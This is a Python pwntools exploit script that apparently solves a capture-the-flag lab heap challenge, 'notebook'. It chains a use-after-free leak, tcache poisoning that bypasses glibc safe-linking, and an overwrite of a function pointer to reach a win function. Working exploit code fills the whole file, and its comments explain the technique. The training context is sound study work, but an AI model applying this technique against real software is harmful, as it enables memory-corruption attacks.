#!/usr/bin/env python3
from pwn import *
HOST = "offsec.m0lecon.it"
PORT = 13589
context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab10/challenges/03_notebook/notebook', checksec=False)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

win = elf.sym.win
global_handler = elf.sym.global_handler

#allocate item 0. Free item 0. Edit item 0 fd to the address of global_handler pointer with the edit function (UAF).

# allocate item 0 and item 1, so there are 2 chunks in the free list
# Now i allocate item 0, then item 1. Item 1 will point to global_handler pointer. Set it to win with edit items[1].
# Then call trigger.

# note: safe linking. protected fd
#To poison a tcache fd you must know the heap address of the freed chunk and encode the target
#fd = (&fd>>12) XOR real_fd

#so i need the heap address of the freed chunk, that is &fd. I need a leak of the freed chunk address for note 0.
#so when i overwrite note 1 fd, i set it to (&fd>>12) XOR p64(global_handler)

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'0') #allocate note 0
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'0') #free note 0

#leak freed chunk address = &fd with show
#the bin in tcache has only one 2 freed chunk, real fd of the note 0 chunk is NULL, so safe-linking stores:
#encoded_fd = (&fd >> 12) XOR NULL = &fd >> 12

p.sendlineafter(b'> ', b'4')    # show note 
p.sendlineafter(b'index: ', b'0') #show freed note 0
leak = u64(p.recv(8).ljust(8, b'\x00')) #at offset 0 of the free chunk for note 0 there is the encoded_fd

fd_safe_link = leak ^ global_handler # (&fd >> 12) XOR real_fd

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'0') #allocate note 0
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'1') #allocate note 1
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'1') #free note 1

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'0') #free note 0

# head -> note0 -> note1

p.sendlineafter(b'> ', b'3')    # send data to edit note 0 fd to global_handler pointer
p.sendlineafter(b'index: ', b'0')
p.sendlineafter(b'data: ', p64(fd_safe_link))     #fd is in the first 8 bytes of the free'd chunk

#FREE CHUNKS: note 0 (fd-> global_handler); note 1 (fd -> NULL)

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'0') #allocate note 0
p.sendlineafter(b'data: ', b'dummy') #consumes note 0

#now because fd is set to global_handler, next allocation will point to global handler

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'1') #allocate note 1
p.sendlineafter(b'data: ', p64(win)) #note 1 address is the same of global_handler

p.sendlineafter(b'> ', b'5')    # triggers global_handler witch points to win

p.interactive()